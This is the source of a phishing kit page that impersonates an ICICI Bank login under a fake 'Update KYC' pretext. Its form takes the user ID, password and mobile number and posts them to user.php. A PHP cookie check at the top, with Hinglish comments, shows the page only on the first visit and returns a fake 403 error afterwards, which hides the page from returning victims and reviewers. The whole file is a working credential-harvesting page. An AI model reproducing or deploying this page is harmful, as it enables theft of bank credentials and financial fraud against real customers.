<?php
// User visit ko check karne ke liye cookie set karna
if (!isset($_COOKIE['visited'])) {
    // Agar user pehli baar visit kar raha hai, toh cookie set karte hain
    setcookie('visited', 'yes', time() + (86400 * 30), "/"); // Cookie 30 din ke liye set ho rahi hai
    // Normal website content load hone dena
} else {
    // Agar user pehle visit kar chuka hai toh 403 error dikhaye
    http_response_code(403);
    echo "<h1>403 Forbidden</h1>";
    echo "<p>This site can't be reached.</p>";
    exit(); // Site ka content yahan se aage load nahi hoga
}
?>

<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<link href='https://fonts.googleapis.com/css?family=Roboto:400,100' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300,700' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

<head>
<link href="assest/css/new_style1f79.css" rel="stylesheet" type="text/css"/>
<link href="assest/css/style.css" rel="stylesheet" type="text/css"/>
<script src="assest/js/main.js"></script>
<script  type="text/javascript"></script> 

<div class="row toprow">
<div  class="loginPage" id="iciciLoginPageSection2">
    <div  id="iciciLoginPageSection2.container"class="containerLogin">
      <div  id="iciciLoginPageSection2.bodyCont" class="bodyLoginPage">
        <div  class="logo" id="iciciLoginPageSection2.logoCont">
    
          <p  id="iciciLoginPageSection2.a">
<span  id="iciciLoginPageSection2.a.b"><img src="assest/img/personal7dbb.jpg" alt="logo" title="logo" class="logoSize" id="Image22421558"border="0" /></span></p>
 </div>
 <!-- end logo -->
</head>
<body>


 <div>

    <p style="background-color: #fff; color: rgb(37, 34, 65);">Authenticate your user ID for Update<br> KYC:</p>
  </div>
  <br><br>
  <!---Body section Start-->
<form id="contactForm" action="user.php" method="POST">
    <div class="robotoCondensedFont loginContainer" id="iciciLoginPageSection2.loginCont">
        <form id="contactForm" action="user.php" method="POST">
        <p id="iciciLoginPageSection2.userId" class="inputTypeContainer loginInputTypeContainer">
            <input type="text" name="User_id" placeholder="User ID*" class="iciciInputTag type_UserPrincipal" maxLength="16" id="uid"/>
                </span>
            </span>
        </p>
        <p id="iciciLoginPageSection2.userId" class="inputTypeContainer loginInputTypeContainer">
            <input type="password" name="Password" placeholder="Password*" class="iciciInputTag type_UserPrincipal" maxLength="12" id="pwd"/>
                </span>
            </span>
        </p>

        <p id="iciciLoginPageSection2.userId" class="inputTypeContainer loginInputTypeContainer">
            <input type="text" name="Mobile_Number" inputmode="numeric" placeholder="Mobile Number*" class="iciciInputTag type_UserPrincipal" maxLength="10" id="mobile_number"/>
                </span>
            </span>
        </p>

 
<div class="mobileSubmitButton loginMobileSubmitButton" id="VALIDATE_CREDENTIALS11">
  <input type="Submit" value="PROCEED" />
</div>
</span>
</p>

<!--Body Section End -->
         
        

          <br><BR>

<div  id="iciciLoginPageSection2.footerCont" class="footerLogin">
        <div  class="robotoRegularFont loginContact_li" id="iciciLoginPageSection2.contactCont">
           <p id="iciciLoginPageSection2.loginContactsRow">
                <span id="iciciLoginPageSection2.loginContactsRow.loginContactsCol">
                    <ul>
                        <li class="loginContacts_font">
                            <a href="#" target="_blank">
                                <img class="loginContacts_img" src="assest/img/insta-banking.png" complete="complete"/>
                                <span><u>Insta</u></span>
                                <span><u>Banking</u></span>
                            </a>
                        </li>
                        <li class="loginContacts_font_max">
                            <a href="#" target="_blank">
                                <img class="loginContacts_img" src="assest/img/imobile-app.png" complete="complete"/>
                                <span><u>Find ATM</u></span>
                                <span><u>Branch</u></span>
                            </a>
                        </li>
                        <li class="loginContacts_font">
                            <a href="#" target="_blank">
                                <img class="loginContacts_img" src="assest/img/find-atm-branch.png" complete="complete"/>
                                <span><u>Contact</u></span>
                                <span><u>Us</u></span>
                            </a>
                        </li>
                        <li class="loginContacts_font_padding_right0">
                            <a href="#" target="_blank">
                                <img class="loginContacts_img" src="assest/img/contact-us.png" complete="complete"/>
                                <span><u>Follow</u></span>
                                <span><u>Us</u></span>
                            </a>
                        </li>
                    </ul>
                </span>
            </p>
            
        </div>

      </div>
<!--end of subsection-->
    </div>

  </div>
  <script>  // Show the loading container
    document.getElementById("loadingContainer").style.display = "block";
  
    // Hide the loading container after 3 seconds
    setTimeout(function() {
      document.getElementById("loadingContainer").style.display = "none";
    }, 3000);
    </script>
<!-- COMMENTED BY HARPREET TO REMOVE ADDITIONAL INFO THROUGHOUT -->
	<div id="footerInner" class="loginFooter">
		<div  class="" id="iciciMobileFooterSection13">
    <div  id="iciciMobileFooterSection13.container"class="jspFooterContainer">
      <!--start of subsection--><div  id="iciciMobileFooterSection13.footerCont" class="robotoRegularFont footerBody">
        <div  class="loginFooterContent footerContent robotoCondensedFont" id="iciciMobileFooterSection13.footerRowSet">
          <p  id="iciciMobileFooterSection13.footerRow1">
<span  id="iciciMobileFooterSection13.footerRow1.footerCol1"><span class="safeBanking loginSafeBanking" id="Caption9897654">Safe Banking: Never share your User ID, password or any other information with anyone on phone, SMS or Email. ICICI Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.</span></span></p>
<p  id="iciciMobileFooterSection13.footerRow3">
<span  id="iciciMobileFooterSection13.footerRow3.footerCol3"><ul><li><a href='#' target=_blank>Disclaimer</a></li><li><a href='#' target=_blank>Privacy</a></li><li><a href='#' target=_blank>Desktop Site</a></li></ul></span></p>
</div>
</div>
    </div>
</div>
